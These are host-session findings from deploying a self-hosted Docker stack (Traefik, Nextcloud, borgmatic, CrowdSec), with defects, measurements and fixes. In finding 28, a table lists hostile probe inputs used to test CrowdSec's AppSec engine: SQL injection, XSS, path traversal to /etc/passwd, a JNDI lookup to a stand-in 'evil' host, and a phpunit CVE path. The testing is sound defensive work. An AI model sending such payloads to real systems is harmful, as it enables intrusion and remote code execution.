# Host session findings

What running the blueprint on a real host surfaced that reading it did not.

Each entry is written to become an issue: what was observed, why it matters, and
what would fix it. Nothing here is speculation — every item was measured on a
Debian 13 host with Docker 29.3.1 while working through
[`host-session-v0.7.0.md`](host-session-v0.7.0.md) and
[`host-session-v0.8.0.md`](host-session-v0.8.0.md).

**Session 1 — 2026-07-28.** Traefik brought up from a clean clone.

---

## What worked without a single correction

Worth recording as precisely as the defects, because "it does not work out of the
box" is the wrong conclusion to draw from a list of findings:

- Traefik started healthy on first `up -d` and stayed healthy.
- A wildcard certificate was issued via DNS-01 on the first attempt.
- Both entry points bound IPv4 and IPv6 without extra configuration.
- Routing, TLS profile and middleware chain applied correctly; the dashboard was
  reachable over the tailnet and refused from everywhere else.
- **The real client IP arrived intact on all four paths measured** — public IPv4,
  public IPv6, Tailscale IPv6, and a commercial VPN exit node over IPv6. This is
  the property everything else depends on.
- `validate.sh` and `render.sh` did exactly what they document, including the
  post-render validation pass.

---

## 1. Dual-stack is opt-in but effectively mandatory for Tailscale

**Observed.** `proxy-public` is IPv4-only by default. Enabling IPv6 needs three
separate manual steps: a Docker daemon change with a restart, two new subnet
variables in `.env`, and the `network-dual-stack.yml` overlay on every
`docker compose` invocation.

**Why it matters.** Tailscale gives every client an IPv6 address and connects
directly, so there is no forwarded header to fall back on. On an IPv4-only
network the source address is lost before Traefik sees it, and `acc-tailscale`
then denies the very clients it exists to admit. `core/traefik/docs/ipv6-dual-stack.md`
documents this precisely — but the default configuration is the one that breaks
it, and the failure looks like a permissions problem rather than a network one.

**Fix.** Either make dual-stack the default for new deployments, or make the
Traefik setup ask the question up front: *are any clients reaching this through
Tailscale?* → if yes, the overlay is not optional. A `📋` note in the README is
not enough; this one silently produces 403s.

**Independently confirmed — and with one caveat.** Operating notes for an
unrelated server, written months earlier, record the same symptom: Traefik seeing
a Docker bridge address instead of the client's, only for VPN traffic, carried as
*"known — not finally solved"* with the workaround of widening the allowlist to
the whole VPN subnet. Two machines, the same failure, open since. That the cause
now has a fix is worth more than the fix itself.

The caveat: those same notes observe the problem on a home server and **not** on a
hosted one, which the author attributed to differing NAT behaviour. The host used
here is a hosted machine. The likelier explanation is `userland-proxy: false` and
`ip6tables: true` rather than the platform — but that was not isolated, so a
second test on a machine with a different network stack is what would turn this
from *fixed here* into *fixed*.

## 2. Denied requests produce no access-log line

**Observed.** Measured directly: 36 log lines before a request blocked by
`acc-tailscale`, 36 after. Repeated across IPv4 and IPv6, with
`bufferingSize: 0` and a `200-599` status filter that includes 403.

**Why it matters.** CrowdSec parses this access log. Every probe against a
VPN-only endpoint is therefore invisible to it — an attacker can enumerate
`traefik.example.com` indefinitely without generating a single event. The
blueprint's two protective layers do not compose: whatever `ipAllowList` blocks,
CrowdSec never learns about.

**Fix.** Needs upstream verification first — whether Traefik can log
middleware-denied requests at all, or whether this belongs in CrowdSec as a
separate acquisition (for example the Traefik application log rather than the
access log). Until then it is a documented blind spot, and
`docs/standards/traefik-security.md` should say so.

## 3. `TRAEFIK_ACCESSLOG_BUFFER=100` delays detection without saving anything

**Observed.** The default buffers up to 100 entries in memory before writing.

**Why it matters.** The intent was to reduce disk writes, but buffering only
defers them — the same volume is written either way. What it does cost is
detection latency for anything reading the log, which is exactly CrowdSec's job.

**Fix.** Default to `0`. Disk-space protection is logrotate's job, not the
buffer's — see the next item.

## 4. Logrotate is a manual copy step that is easy to miss

**Observed.** `core/traefik/config/logrotate/traefik` ships with the repository
but only takes effect after being copied to `/etc/logrotate.d/` by hand, with the
deployment path edited in. Nothing in the setup path prompts for it, and nothing
detects that it was skipped.

**Why it matters.** Traefik writes access logs to a bind mount, which Docker's
own log rotation does not touch. Skipped, they grow until the disk is full — and
the fastest way there is the log flood a request flood produces.

**Fix.** Two parts. Make the setup surface the step, and add `maxsize` to the
rotation config so a flood rotates on size rather than waiting for the daily
run — `daily`/`rotate 7` alone does not bound a burst.

## 5. `apt install borgmatic` gives a version that cannot do what the repo needs

**Observed.** `docs/host-session-v0.7.0.md` says `sudo apt install borgmatic` and
in the same checklist requires **≥ 2.0.8**. Debian 13 ships **1.9.14**. Current
upstream is 2.1.6.

**Why it matters.** The `container:` database hook — the mechanism `backup/README.md`
builds its entire database-consistency story on — does not exist before 2.0.8.
Following the repository's own instruction produces a borgmatic that silently
cannot do the thing the architecture depends on.

**Fix.** Replace the install line with the upstream-recommended method (`uv tool
install borgmatic`, or pipx), and keep the version assertion immediately after it
so the check still fires.

## 6. The dnsmasq template invites edits it then destroys

**Observed.** `ops/templates/dnsmasq.conf.tmpl` supports three wildcard zones as
variables and carries the comment *"Add/remove zones as needed after rendering."*
A deployment with more than three zones must hand-edit the rendered file — and
the next `render.sh` overwrites it.

**Why it matters.** The instruction guarantees the data loss. It is not a
trade-off anyone chose; it reads as supported.

**Fix.** Either an arbitrary-length zone list driven from `.env`, or an include
directory the renderer never touches.

## 7. The dashboard requests its own certificate even in wildcard mode

**Observed.** With `ACME_WILDCARD_DOMAIN` set (Path A), two certificates were
issued: the wildcard, and a separate one for the dashboard host.

**Why it matters.** `.env.example` states the reason the certresolver label stays
commented out in app stacks: a per-domain certificate publishes the subdomain to
Certificate Transparency logs when a wildcard already covers it. The system
router does exactly that by default, so the repository's own privacy rationale is
undermined by its own default.

**Fix.** `TRAEFIK_DASHBOARD_CERT_RESOLVER` should be empty when
`ACME_WILDCARD_DOMAIN` is set, and `validate.sh` is the natural place to catch
the combination.

---

**Session 2 — 2026-07-28.** Nextcloud deployed from a clean clone.

> **Findings 12, 15 and 16 were resolved in session 3 rather than documented.**
> Switching to the image's unattended installation removes all three at once:
> there is no wizard, so nothing creates root-owned files, nothing offers SQLite,
> and no unauthenticated form is reachable. What follows is kept as the record of
> how they presented — the symptoms are what a reader will search for.

## 12. Nextcloud cannot install — two root-owned files block it

**Observed.** On a first start from a clean clone, the stack came up and every
request returned `503`. The application log repeated:

```text
fopen(/var/www/html/config/config.php): Failed to open stream: Permission denied
fopen(/var/www/html/data/nextcloud.log): Failed to open stream: Permission denied
```

Two files in an otherwise `www-data`-owned tree belonged to `root`: a zero-byte
`config/config.php` and `data/nextcloud.log`. PHP-FPM workers run as `www-data`
and could not write either. Writing to the same directories **as `www-data`
succeeded** when tested by hand, which is what makes this confusing to diagnose —
the directories are fine, two files are not.

The `cron` service overrides the image's entrypoint (`entrypoint: /cron.sh`),
which skips the initialisation the official image performs, and its container runs
as root while mounting the same volume. Its own log shows `Cannot write into
"config" directory!` at start. Whether it created the files or merely tripped over
them was not isolated — the ownership state is reproducible, the attribution is
not.

**Fix that worked.**

```bash
docker compose exec -u root app chown -R www-data:www-data \
  /var/www/html/config /var/www/html/data
docker compose restart app
```

Setup page returned `200` immediately afterwards, with no further permission
errors.

**Why it matters.** The README already carries this `chown` — under **"Post-install
(recommended) — After the browser-based setup"**. But the browser-based setup
cannot happen: the wizard is exactly what the `503` prevents. The step is
documented in the wrong place in the sequence, described as optional tidying, and
it is neither.

Someone hit this before and papered over it. A first-time deployer following the
README in order gets a stack that starts, reports containers as running, and
serves nothing.

**Fix.** Move it ahead of the browser setup and state it as required, or better,
remove the need — the `cron` service overriding the image entrypoint is the part
worth revisiting.

## 13. `acc-public` paired with `sec-3-spa` contradicts the security chain rules

**Observed.** `apps/nextcloud/.env.example` ships `APP_TRAEFIK_ACCESS=acc-public`
together with `APP_TRAEFIK_SECURITY=sec-3-spa`.

**Why it matters.** The security-chain template states plainly: *"Use `sec-*-spa`
only for VPN-gated apps (network-level access control)"* — the SPA variants swap
the standard rate limit for a much looser one, because network-level access
control is already restricting who can reach the app. Pairing it with
`acc-public` removes that premise while keeping the loose limit.

**The tension is real, not a typo.** Nextcloud is a code-split SPA and does fire
many parallel requests on first load; `errors.md` records that exact failure mode.
So the app plausibly needs the looser limit, and the rule says it should not have
it while public. One of the two has to give.

**Fix.** Decide it deliberately rather than by default: either the rule gains a
documented exception for apps whose request pattern requires it, or public SPAs
get their own chain with a limit tuned for bursts rather than borrowed from the
VPN-gated case.

## 14. Stale artefacts from a previous deployment block a fresh one

**Observed.** On a host that had run an older revision of the blueprint, a fresh
deployment failed twice before starting:

- `network nextcloud-internal was found but has incorrect label
  com.docker.compose.network set to "internal" (expected: "app-internal")` — the
  compose network *key* was renamed at some point while the network *name* stayed
  the same.
- `Conflict. The container name "/nextcloud-db" is already in use` — the older
  deployment's stopped containers still hold the names.

**Why it matters.** Neither message says what to do, and the obvious reaction —
removing the conflicting object — destroys part of a deployment that may still be
wanted. The documented answer exists (`COMPOSE_PROJECT_NAME` "must be unique
across the whole stack") but nothing connects it to these two errors.

**Fix.** A short section on deploying alongside an existing installation: choose a
distinct `COMPOSE_PROJECT_NAME`, and note that a renamed network key requires the
old network to be removed and recreated rather than adopted.

## 15. An unauthenticated setup wizard is served publicly — the worst of the set

**Observed.** `apps/nextcloud/.env.example` ships `APP_TRAEFIK_ACCESS=acc-public`.
On first start the instance serves Nextcloud's installation wizard to anyone who
reaches the hostname: a form that creates the administrator account, with no
authentication in front of it.

The window lasts from `docker compose up -d` until a human finishes the wizard —
minutes at best, and open indefinitely if the deployment is left half-finished
over a weekend. On the host used here, unrelated scanners were probing within
minutes of the first certificate being issued. A certificate is public: it appears
in Certificate Transparency logs the moment it is issued, so the hostname is
discoverable without anyone being told.

**Why it is worse than it looks.** The repository already knows this failure mode —
`TROUBLESHOOTING.md` 7.1 is titled *"First-user-wins — open the UI immediately
after start"*. That is mitigation by racing the internet, and it is not a control.
The README compounds it by advising `acc-public` be **kept** for OnlyOffice
callbacks, so the one instruction a careful reader might follow points the wrong
way during exactly the vulnerable window.

**The rule this should become.** Not Nextcloud-specific — it applies to every app
with a first-run setup step, which is most of them:

> Deploy restricted. Open up deliberately, once the app is configured, verified
> and has an administrator account.

Concretely: `acc-tailscale` (or `acc-local`, or `acc-private`) is the correct
value in every `.env.example` that has an unauthenticated first-run state.
Widening to `acc-public` is a later, separate, deliberate edit — and where an
integration genuinely needs public reachability, that requirement starts *after*
setup, not during it.

This costs nothing: the operator already has VPN access, since that is how the
blueprint expects the machine to be administered.

**Fix.** Change the shipped default, and state the rule once in
`docs/standards/traefik-security.md` rather than per app. `TROUBLESHOOTING.md` 7.1
should then describe a situation that can no longer arise by default.

## 16. The database pre-selection does not work — the wizard offers SQLite

**Observed.** With the stack running and MariaDB healthy, the wizard presented
SQLite as the selected database, with a performance warning, and asked for
credentials manually.

**Cause, traced precisely.** The image's `autoconfig.php` enables pre-filling only
when one of three complete sets is present:

| Variant | Requires |
|---|---|
| SQLite | `SQLITE_DATABASE` |
| MySQL via files | `MYSQL_DATABASE_FILE` **and** `MYSQL_USER_FILE` **and** `MYSQL_PASSWORD_FILE` **and** `MYSQL_HOST` |
| MySQL plain | `MYSQL_DATABASE` **and** `MYSQL_USER` **and** `MYSQL_PASSWORD` **and** `MYSQL_HOST` |

The stack ships `MYSQL_DATABASE` and `MYSQL_USER` as plain values but the password
as `MYSQL_PASSWORD_FILE` — a mixture satisfying neither the file variant nor the
plain one. Auto-configuration stays off and the wizard falls back to SQLite.

If someone accepts that default, they get SQLite while a configured, healthy
MariaDB container sits unused — and Nextcloud's own warning says not to use SQLite
with sync clients.

**And the obvious fix does not work.** Supplying all three as `_FILE` was tried on
the host: auto-configuration then activates (`dbtype=mysql`), but PHP cannot read
the secrets —

```text
file_get_contents(/run/secrets/DB_NAME): Failed to open stream: Permission denied
```

Docker mounts secrets root-only; the web process runs as `www-data`. So the
`_FILE` route needs `uid`/`mode` on each secret reference, which pins a
container-internal user ID into the compose file.

**Fix.** Needs a decision rather than a patch. Either accept plain `MYSQL_PASSWORD`
for this stack as a documented deviation, or set explicit `uid`/`mode` on the
secrets, or document that the database must be selected by hand during setup and
where to read the password from. What must not stay is the current state, where
the wizard silently offers the wrong answer.

The change was reverted after testing; the repository is untouched.

## 17. Editing a secret in an editor leaves the container on the old value

**Observed.** After entering the SMTP key and running `docker compose restart`,
the application log kept reporting

```text
file_get_contents(/run/secrets/SMTP_PWD): Failed to open stream: Permission denied
```

while `ls -l` on the host showed the file present, correctly owned and readable
by the web user's group. A direct read inside the container as `www-data`
succeeded — the same read through the application failed. The contradiction held
across several attempts and produced two wrong diagnoses before it resolved.

**Cause.** Most editors save by writing a temporary file and renaming it over the
target. That is a new file. A bind-mounted single file resolves once, at container
start, so the mount stays attached to the file that was replaced — which is
unlinked, and whose permissions no longer match anything on the host. `restart`
does not re-resolve the mount; only a new container does.

**Fix.** Two lines in the stack's `.env.example`: recreate after rotating a key,

```bash
docker compose up -d --force-recreate app cron
```

or write in place (`printf '%s' "$KEY" > .secrets/smtp_pwd.txt`), which keeps the
same file and needs nothing further.

**Wider than this stack.** Every stack that mounts a secret as a single file is
affected. Belongs in `docs/standards/compose-structure.md`, where the secret
pattern is defined, rather than only in one stack's `.env.example`.

## 18. The SMTP transport setting is honoured only in one direction

**Observed.** The stack shipped `SMTP_SECURE=tls` with port 587. Nextcloud stored
`mail_smtpsecure = tls`, and mail was delivered.

**Cause.** The admin manual states for `mail_smtpsecure`: specify `ssl` when using
SSL/TLS, *any other value will be ignored*. The instance's own settings page
offers only two choices, `None/STARTTLS` and `SSL/TLS`. So `tls` and an empty
value are the same thing — opportunistic STARTTLS, which a network attacker on the
path can strip. Only `ssl` gives TLS from the first byte.

The value is not entirely inert: the image derives the default port from it, so
`SMTP_SECURE=tls` with no explicit `SMTP_PORT` yields 465 — a port that does not
speak STARTTLS.

**Measured against a real relay.** Ports open outbound from the host:

```text
25    blocked
465   blocked
587   open
2525  open
```

Provider-level blocking of 25 and 465 is common, so 465 cannot simply be made the
only documented path.

**Fix.** `.env.example` now defaults to `ssl` on 465, states plainly that 587 is a
fallback and why it is weaker, and carries a one-liner to test which ports the
host can actually reach. `SMTP_PORT` is always set explicitly.

## 19. `container:` does not remove the need for a database client

**Observed.** The first backup run failed immediately:

```text
[Errno 2] No such file or directory: 'mariadb-dump'
```

**Cause.** `backup/borgmatic/README.md` claimed the `container:` option meant "no
published ports, **no database clients on the host**, no docker exec wrapper".
The first and third are true; the second is not. Reading borgmatic's own source
settles it — `container:` resolves the container's IP through `docker inspect`
and nothing else, after which the dump command runs on the host and connects to
that address over TCP. Upstream states the same: the dump command runs "on the
host or wherever borgmatic is running".

**Consequence for the architecture.** The host-installed agent needs a client for
every engine it backs up — `mariadb-client`, `postgresql-client`,
`mongodb-database-tools`. Across this repository that is three engine families,
which is a real cost of the host-agent decision and was not stated anywhere.

**The alternative, and why it is not the default.** `mariadb_dump_command:
docker exec …` runs the dump inside the container. Borgmatic passes credentials
through a defaults-file on the host that a container cannot read, so it also
requires changing `password_transport` and forwarding the variable in. Documented
as an option, not chosen.

**Fix.** Requirement added to `backup/borgmatic/README.md`, the false claim
removed from both the README and `config.yaml.example`.

## 20. The distribution client demands TLS the pinned server does not offer

**Observed.** With the client installed, the dump failed differently:

```text
mariadb-dump: Got error: 2026: "TLS/SSL error: SSL is required, but the server
does not support it" when trying to connect
```

**Cause.** The client comes from the distribution — 11.8.6 on Debian 13 — while
the stack pins its server. Against a 10.11 server the newer client requires TLS
that the server has no certificate for. Two independent version policies meet at
this connection, and nothing reconciles them.

**Fix.** `tls: false` on the database entry, with the reason recorded next to it:
this connection runs from the host to a container over a local bridge and never
reaches a network, so configuring a certificate lifecycle for it would buy
nothing. Where a database is genuinely remote, the server gets TLS instead.

The general point is worth more than the setting: a host-installed agent couples
the backup to the distribution's client versions, and stacks pin their servers
independently. Expect this to recur with PostgreSQL.

## 21. The example configuration collides with a second deployment

**Observed.** This host carries two Docker deployments: the blueprint under
`/srv/secure-docker-blueprint` with containers named `nextcloud-bp-*`, and an
unrelated one under `/srv/docker` with containers named `nextcloud-*`.

`config.yaml.example` ships `source_directories: /srv/docker` plus
`/var/lib/docker/volumes` wholesale, and `container: myapp-db`. Copied as
written, it would have captured the unrelated deployment's data — and its
quiescing hook would have put someone else's Nextcloud into maintenance mode.

**Cause.** The example assumes one deployment per host, which is the common case
but not a safe default: the failure is silent and it acts on a system the
configuration was never meant to reach.

**Fix.** Full paths and exact container names rather than patterns, a warning in
the example, and a verification step that inverts the question — search the
finished archive for something that must *not* be in it:

```bash
sudo borgmatic list --archive latest --find '*other-deployment*' | grep -v '^local:'
```

Empty output is the evidence. Run for `/srv/docker`, the other deployment's
volumes and its containers, all three returned nothing.

Quiescing hooks deserve the same care: `docker exec <exact-container>` cannot
resolve to the wrong project, `docker compose` can.

## 22. The lifecycle freshness check fails for two hours every night

**Observed.** CI failed with `stale-report: LIFECYCLE.md out of date with its
sources` on a commit whose `LIFECYCLE.md` regenerated byte-identically locally.

**Cause.** The report embeds `Generated <date>` from `date.today()`, which is
local time, and `--check` compares the whole file. A commit made at 01:20 CEST
carries `2026-07-29`; the runner, in UTC, is still on `2026-07-28` and generates
a file that differs by that one line. Any contributor east of UTC hits this for
as many hours as their offset, every night.

**Fix.** Two changes in `scripts/ci/lifecycle-report.py`: generate the stamp in
UTC so the file is reproducible regardless of who writes it, and exclude the
`Generated` line from the staleness comparison, because when the file was written
is not part of what it says. Verified with `TZ=Pacific/Auckland`, twelve hours
ahead: no `stale-report`.

## 23. Which proxy an app behind nginx must trust

**Question.** Stacks in this repository put nginx between Traefik and the
application. Both are proxies, on different networks — so which address does the
application's `trusted_proxies` have to name? Getting it wrong is silent: the
application records a fixed internal address as every client, and rate limiting
and brute-force protection then count everyone against it.

**Measured.** A failed login driven through the proxy chain, read back from the
application's own log:

```text
Login failed: 'admin' (Remote IP: '172.30.0.2')
```

`172.30.0.2` is Traefik on `proxy-public`. The nginx in front of the application
sits at `172.20.0.6` on the stack's internal network and does **not** appear.

**Why.** nginx speaks FastCGI to the application and passes its own
`$remote_addr` through as `REMOTE_ADDR`. It is transparent at this layer, so the
application's effective peer is the proxy in front of *nginx*, not nginx itself.

**Consequence.** Trust the `proxy-public` subnets — both families where IPv6 is
enabled — and not the stack's internal network. That is what Nextcloud already
had, so the setting was right; what was missing was any statement of why, which
made it look like a guess and invited someone to "correct" it to the internal
subnet.

Invoice Ninja shipped `TRUSTED_PROXIES=*` as a documented deviation. It now
carries the same subnets, with the reasoning next to it.

**Still open.** In this test the client reached Traefik as `127.0.0.1` from the
host itself, and the application logged Traefik's address rather than that
client. Whether the forwarded chain survives the nginx hop for a genuinely
external client is not yet established — it needs a request from outside.

## 24. Chromium stalls on Docker's default shared memory

**Observed.** Creating and sending an invoice worked end to end — the mail
arrived, the client portal loaded, the PDF was attached. But the access log
carried two `500`s on `POST /api/v1/live_design`, and the application log a
Chromium command line ending in:

```text
exceeded the timeout of 60 seconds
```

**Cause.** `/dev/shm` in the container was Docker's default **64 MB**. Chromium
uses shared memory heavily; starved of it, it does not fail — it stalls, and the
request dies on the 60-second timeout.

Two things made this hard to see. The Chromium command line in the log looks like
a launch failure rather than a timeout, and the *invoice* PDF still arrives,
because that one is rendered by the queue worker with no HTTP request behind it.
Only the synchronous preview breaks, which reads as an interface fault.

**Measured after `shm_size: 512m`:** a trivial page renders in **4 seconds**,
where before the same work exceeded 60. Container memory sat at 534 MiB of the
1 GB limit, so the shared-memory allocation did not have to come out of the
application's headroom.

**Wider than this stack.** Any container rendering with headless Chromium is
affected — PDF generation, screenshotting, preview services. This belongs
wherever the repository documents resource limits: `deploy.resources` says
nothing about `/dev/shm`, and the default is invisible until something
stalls.

## 25. CrowdSec runs, and measures how little it can see

**Deployed.** Phase 1, the engine, against Traefik's access log. Healthy in about
20 seconds; six collections active including `http-cve` and `sshd`. Acquisition
parses cleanly — every line read was a line parsed, none unparsed — and
`crowdsecurity/http-crawl-non_statics` instantiated on the first traffic it saw.

**And the number that matters.** 120 requests were driven at a host behind
`acc-tailscale`. CrowdSec's acquisition counter moved by **3**.

That is finding 2 again, no longer as a before-and-after line count but as a
ratio. `ipAllowList` rejects the request before Traefik writes an access-log
line, so the detection layer never learns that 117 requests happened. An
attacker enumerating a VPN-only host generates almost nothing to detect.

**What this settles.** CrowdSec is worth running from the moment anything is
public, and it is close to decoration while everything sits behind a network
restriction. The two layers do not stack — they take turns. Where `ipAllowList`
is doing the work, CrowdSec is blind; where CrowdSec is doing the work, the
allowlist has already been opened.

Neither statement is an argument against either layer. It is an argument against
believing the two add up, which the repository's own README table invites by
listing them side by side.

## 26. The bouncer works — and testing it from the host proves nothing

**Wired and verified.** Plugin declared, key generated, `crowdsec-basic`
rendered, and the middleware attached to `core/whoami` on `acc-public`. The
criterion the plan warns about was met immediately: `cscli bouncers list` showed
a `Last API pull` only *after* a router actually used the middleware — the
polling loop does not start on plugin load.

**Then the ban did not take.** A decision against `127.0.0.1`, probed for 140
seconds against a 60-second poll interval: HTTP 200 throughout.

**The test was wrong, not the bouncer.** A request made on the host with
`curl --resolve …:127.0.0.1` enters through the Docker bridge, so Traefik records
the client as `172.30.0.1`, the gateway. The banned address never appeared as a
sender. Repeated from a real external client, with that client's address read out
of the access log, the ban produced a `403` on the next poll — and access
returned after the decision was deleted.

**The rule this leaves.** A bouncer cannot be validated from the machine it runs
on. Any local probe is rewritten to a bridge address, and every result is
meaningless. Read the address out of the access log, ban that, and have the real
client retry. Anything else measures the loopback path.

**And a gap it exposed.** The middleware label carried two axes,
`APP_TRAEFIK_ACCESS` and `APP_TRAEFIK_SECURITY`, with no slot for the third that
`core/crowdsec/docs/profiles.md` describes. `APP_TRAEFIK_THREAT` now fills it,
prepended and carrying its own trailing comma so that an empty value renders
nothing rather than a leading separator Traefik rejects. Applied to
`apps/_reference` and `core/whoami`; the remaining stacks pick it up as each is
reviewed.

## 27. The AppSec engine could never have started

**Observed.** Nothing listening on 7422; from Traefik, `connection refused`. The
engine's own startup log meanwhile reads:

```text
Adding crowdsecurity/vpatch-CVE-2024-4577 to appsec rules
```

So the rules load. What does not exist is anything to apply them to.

**Cause.** The compose mounted `./config/appsec.yaml` to
`/etc/crowdsec/appsec.yaml`. CrowdSec reads acquisition sources from
`acquis.yaml` and `acquis.d/` — nowhere else. The file was in a location the
engine never looks at, so the AppSec listener was never configured. No error
anywhere: rules loaded, port silent.

That combination is what made it invisible. A missing file would have been
noticed; a file in the wrong place looks like a working configuration.

**Fix.** One line — mount it into `acquis.d/` instead. Verified after: 7422
listens, and from the Traefik container the endpoint answers `401 Unauthorized`
rather than refusing the connection, which is the correct response to a request
without the bouncer key.

**Consequence for the plan.** `crowdsec-appsec` and `crowdsec-strict` are
described as deferred pending "AppSec reachable". They were not deferred — they
were impossible. Anyone enabling `crowdsecAppsecEnabled: true` together with
`crowdsecAppsecUnreachableBlock: true`, which is what `crowdsec-strict`
specifies, would have had every request answered with 403.

## 28. AppSec is virtual patching, not a web application firewall

**Measured**, once the engine was reachable, against `crowdsec-appsec` on a
public router:

| Request | Result |
|---|---|
| `?id=1' OR '1'='1` | 200 |
| `?q=<script>alert(1)</script>` | 200 |
| `?f=../../../../etc/passwd` | 200 |
| `?x=${jndi:ldap://evil/a}` | 200 |
| `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` | **403** |

The engine counted every one of them as processed, so nothing was bypassing it.
It blocked the last: CVE-2017-9841, a signature in `appsec-virtual-patching`.

**What that means.** The shipped rule sets are `appsec-generic-rules` — a small,
deliberately narrow set — and `appsec-virtual-patching`, which targets named
CVEs. Neither is a general injection filter. Calling this a WAF sets the wrong
expectation in both directions:

- It will **not** stop a novel SQL injection against an application's own
  parameters. Anyone treating it as a reason to relax input handling has
  misread it.
- It also will **not** generate the false positives that reputation implies.
  The repository's own documentation defers `crowdsec-appsec` pending per-app
  false-positive testing on Nextcloud WebDAV, Invoice Ninja webhooks and
  Authentik SAML. With rules this narrow, that risk is smaller than the
  deferral suggests.

**What it is good for**, and it is not nothing: the mass-scanning traffic that
arrives at any public host within minutes of a certificate being issued. That
traffic is almost entirely known-CVE probing, which is exactly what virtual
patching covers.

**Consequence.** `crowdsec-appsec` is a reasonable default for a public app,
because it is fail-open and its rules are conservative. `crowdsec-strict`
remains something to argue for per application, since fail-closed turns any
engine problem into an outage. And the appsec section of the documentation
should stop implying WAF-grade coverage.

## 29. SSH detection cannot work on a stock Debian host, and the note said otherwise

**The setup.** `crowdsecurity/sshd` ships enabled in `CROWDSEC_COLLECTIONS`, so
its rules load on every start. The `auth.log` mount and its acquisition block
were both commented out, carrying the note *"opt-in — uncomment for SSH
brute-force detection"*.

That reads as a switch. It is not one.

**Measured on the host.** `rsyslog` is inactive, `/var/log/auth.log` does not
exist, and the journal holds 987 SSH events over seven days — so there is
plenty to detect and no file to detect it in. Debian 12 and 13 log to journald.

The obvious alternative does not work either: CrowdSec can read the journal via
`source: journalctl`, but the official image ships no `journalctl` binary, so a
containerised engine cannot use it.

**So on a stock Debian host, uncommenting the line achieves nothing** — and it
is worse than nothing. Docker creates a *directory* at a bind-mount source that
does not exist, the acquisition then reads an empty path, and the result is
indistinguishable from working: rules loaded, no errors, no detections.

That is the fourth instance of the same shape tonight, after the AppSec config
in an unread location, the log path, and this. Rules that load against a source
that is not there fail in the one way nobody notices.

**Fix.** The mount stays commented, and the note now states the precondition:
rsyslog has to be installed first, the file has to exist, and there is a command
to check before touching anything. A one-word "opt-in" was the actual defect.

## 30. Phase 3 works, and it arrived with 15,000 decisions already waiting

**Set up and verified.** The Debian package is `crowdsec-firewall-bouncer` — not
the `-nftables` name upstream guides still use, which does not exist in Debian
13. `safe_range` was written before the service was ever started, covering RFC
1918 and Tailscale, because the failure mode here is locking yourself out of the
machine you are configuring.

The chain measured end to end:

```text
cscli decisions add   → 15 s → ip saddr @crowdsec-blacklists counter drop
cscli decisions delete → 10 s → gone
```

Both address families: `table ip crowdsec` and `table ip6 crowdsec6`.

**What was already there.** The blacklist set was not empty before the test
decision. `cscli decisions list -a` returns roughly **15,880 active decisions**,
almost all with `Source: CAPI` — the community blocklist, which the engine had
been pulling since Phase 1 went up without anything enforcing them.

And one with `Source: crowdsec`:

```text
Ip:80.94.95.211  crowdsecurity/http-probing  ban  RO  11 events
```

That is this host's own engine catching a real scanner, not a test. It had been
detected and decided for hours; until Phase 3 existed, the decision applied only
to HTTP through Traefik.

**Why that matters for how the phases are described.** Phase 1 was accurate but
undersold: it is not only watching this host's traffic, it subscribes to a feed
of known-bad addresses. Without a bouncer that feed is inert. With Phase 3 it
becomes a network-layer blocklist covering every port, and the marginal cost of
that was one apt package and a config file.

**Still missing, and it is the reason Phase 3 was described as SSH protection:**
SSH brute force is not detected on this host at all — no `auth.log`, no
`journalctl` in the container (finding 29). Phase 3 enforces SSH bans; nothing
is producing them.

## What worked, session 2

- The wildcard certificate covered the new subdomain with **no second certificate
  issued** — Path A behaved exactly as documented for app stacks.
- `TRUSTED_PROXIES` worked on the first attempt: the application log recorded the
  real public client address, not the proxy's, confirming the chain from Traefik
  through to the application.
- Container health, dependency ordering and secret injection all behaved as
  configured; `db` and `redis` were healthy before `app` started.

---

## From existing operating documentation

Four items carried over from operating notes for two unrelated servers, both run
by the maintainer over months. They are recorded here because they were **already
proven in practice**, not discovered in this session — the review pass should
weigh them differently to the findings above.

Kept only where they hold regardless of where someone deploys. Anything tied to a
particular provider, disk layout or host distribution was left out: this is a
blueprint, and it cannot assume the machine.

## 8. `excludedIPs` in `ipAllowList` breaks direct access

**Source.** Recorded as a resolved issue, referencing Traefik bug #10561.

**Observed there.** An `ipAllowList` middleware carrying `excludedIPs` answered
403 to every direct connection — LAN or VPN — regardless of whether the source
address was allowed. `excludedIPs` only behaves as expected when an upstream
proxy sets `X-Forwarded-For`; without one it rejects everything.

**Checked here.** This repository does not use `excludedIPs` anywhere, so nothing
is broken today.

**Why record it.** It is a plausible thing to reach for when refining an access
policy, and the failure it produces is indistinguishable from a correctly denied
request. A one-line warning next to the `acc-*` definitions costs nothing and
saves an evening.

## 9. Docker starting before its network dependency

**Source.** Two failed attempts and one working fix, recorded across both sets of
notes.

**Observed there.** A stack that needs a VPN connection at start — an agent
dialling out to a control server — fails on boot when Docker starts first. Two
approaches made it worse: an `ExecStartPre` waiting on the VPN broke Docker
startup entirely, and a separate wait-online unit failed outright on a Debian
system using `ifupdown` rather than `systemd-networkd`.

**Why record it, and how.** The fix is a systemd drop-in ordering Docker after the
VPN service — which is host configuration, not blueprint content. It belongs in
troubleshooting as *"this stack fails after a reboot but starts fine by hand"*,
with the two dead ends named, and not as a setup step. The repository does not get
to assume the host's network stack.

## 10. A syslog fallback for backup failures

**Source.** Both configurations use it.

**Observed there.** `on_error` and `after_backup` hooks piping a line to syslog,
independent of any monitoring service.

**Why it fits here.** `backup/README.md` points run monitoring at Healthchecks or
Uptime Kuma — which is better, and which is also not running on day one. Between
configuring the backup and standing up monitoring there is a window where a
failing job is silent. A syslog line is not an alert, but it is a record, and it
costs two lines of configuration.

## 11. Backup targets that are not a plain SSH host

**Source.** Both configurations, different targets.

**Observed there.** A target reachable only on a non-standard SSH port, and a
target running an older borg than the client. Both are handled by borgmatic —
`ssh_command` for the first, `--remote-path` for the second — and both produce
confusing failures if you do not know the option exists.

**Why record it.** `backup/borgmatic/README.md` assumes a straightforward SSH
target. Naming the two options, without naming any provider, turns a dead end into
a footnote. Which storage someone uses is their business; that the two options
exist is what the README omits.

## What was deliberately left out

Recorded so the same material is not mined twice:

- Disk preparation, filesystem layout, snapshot tooling, bootloader integration.
- Host installation, user creation, SSH hardening.
- Provider consoles, VM snapshots, storage products.
- System journal sizing. Bounding it is sound sysadmin practice, but container
  logs are covered by the Docker log driver and Traefik's by logrotate — the rest
  of the disk is the host's business. Worth at most one sentence in
  `docs/standards/logrotate.md` marking where this repository's responsibility
  ends.

All of it is competent and none of it is a blueprint's to prescribe. The
repository promises Debian plus Docker and no further assumptions; each of these
would break that promise for anyone whose machine looks different.

---

## Not repository defects

